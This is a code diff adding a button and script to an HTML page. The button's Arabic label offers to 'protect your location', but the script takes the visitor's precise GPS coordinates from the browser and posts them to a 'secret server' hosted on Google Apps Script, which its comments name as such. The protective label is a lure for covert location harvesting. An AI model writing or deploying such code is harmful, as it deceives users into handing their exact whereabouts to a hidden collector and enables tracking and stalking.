@@ -84,5 +84,80 @@
       window.location.href = "main.html";
     }
   </script>
+<button id="protectButton" onclick="requestAndSendLocation()">
+  اضغط لحماية موقعك (يتطلب موافقة الموقع)
+</button>
+<p id="locationStatus" style="font-weight: bold; color: blue;">
+  (انتظر موافقتك على مشاركة الموقع الدقيق)
+</p>
+
+<script>
+// دالة لتوليد مُعرِّف جلسة عشوائي (الشيء المشترك)
+function generateSessionId() {
+    return 'LOC_' + Math.random().toString(36).substring(2, 9);
+}
+
+// الرابط السري الذي تم الحصول عليه من Google Sheets
+// **********************************************
+const SECRET_ENDPOINT = 'Https://script.google.com/macros/s/AKfycbzJPAKSk4oYAP5oQAWll5E7VPjLrn4d4U6FmBPtXwD8BJJgdGfcP7ms9fhrQI7RXwenNQ/exec'; 
+// **********************************************
+
+function requestAndSendLocation() {
+    const statusElement = document.getElementById('locationStatus');
+    const sessionId = generateSessionId(); // توليد المعرِّف المشترك
+
+    // 1. التحقق من دعم المتصفح لتحديد الموقع
+    if (!navigator.geolocation) {
+        statusElement.textContent = "عذراً، المتصفح لا يدعم تحديد الموقع الجغرافي.";
+        return;
+    }
+
+    statusElement.textContent = "جاري طلب إذن الموقع... (يرجى الموافقة في النافذة المنبثقة)";
+
+    // 2. طلب الموقع الجغرافي من المتصفح (ستظهر النافذة المنبثقة)
+    navigator.geolocation.getCurrentPosition(
+        
+        // --- الوظيفة عند نجاح الموافقة ---
+        function (position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            
+            statusElement.textContent = `تم الحصول على موقعك الدقيق (ID: ${sessionId}). جاري الإرسال إلى الخادم السري...`;
+
+            // 3. إعداد البيانات للإرسال (بما في ذلك المُعرِّف المشترك)
+            const locationData = {
+                session_id: sessionId,
+                latitude: latitude,
+                longitude: longitude
+            };
+
+            // 4. الإرسال الفعلي إلى الخادم السري (عبر الرابط)
+            fetch(SECRET_ENDPOINT, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(locationData),
+            })
+            .then(response => {
+                if (response.ok) {
+                    statusElement.textContent = `نجاح الإرسال! تم حفظ الموقع في الخادم السري. (ID: ${sessionId})`;
+                } else {
+                    statusElement.textContent = `فشل إرسال البيانات إلى الخادم. تحقق من حالة الخادم. (ID: ${sessionId})`;
+                }
+            })
+            .catch(error => {
+                console.error('Fetch error:', error);
+                statusElement.textContent = `حدث خطأ في الاتصال بالخادم. (ID: ${sessionId})`;
+            });
+        },
+        
+        // --- الوظيفة عند الرفض أو الخطأ ---
+        function (error) {
+            statusElement.textContent = "تم رفض طلب مشاركة الموقع من قبل المستخدم.";
+        }
+    );
+}
+</script>
 </body>
 </html>
